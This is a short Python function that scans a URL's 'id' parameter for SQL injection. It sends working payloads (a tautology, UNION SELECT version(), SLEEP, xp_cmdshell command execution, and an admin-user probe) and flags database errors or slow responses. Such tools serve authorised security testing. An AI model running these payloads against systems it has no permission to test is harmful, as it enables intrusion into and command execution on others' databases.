import requests

def detect_sql_injection(url, proxy=None, timeout=5):
    payloads = [
        "' OR 1=1 --", 
        "' UNION SELECT NULL, version() --", 
        "' AND SLEEP(5) --",  
        "'; EXEC xp_cmdshell('dir') --",  
        "' AND 1=CONVERT(int, (SELECT CHAR(65))) --",  
        "' OR EXISTS(SELECT 1 FROM users WHERE username = 'admin') --"  
    ]
    
    headers = {'User-Agent': 'Mozilla/5.0'}
    results = []

    for payload in payloads:
        try:
            injection_url = f"{url}?id={payload}"
            proxies = {"http": proxy, "https": proxy} if proxy else None
            response = requests.get(injection_url, headers=headers, proxies=proxies, timeout=timeout)
            
            if any(error in response.text for error in ["SQL syntax", "Warning: mysql", "You have an error in your SQL syntax", "Unclosed quotation mark"]):
                results.append(f"Possible SQLi with payload: {payload}")
            elif response.elapsed.total_seconds() > 4:  
                results.append(f"Possible Time-based SQLi with payload: {payload}")
        except requests.RequestException as e:
            results.append(f"Error during SQLi test with payload '{payload}': {str(e)}")

    return results if results else ["No SQL injection vulnerabilities detected."]
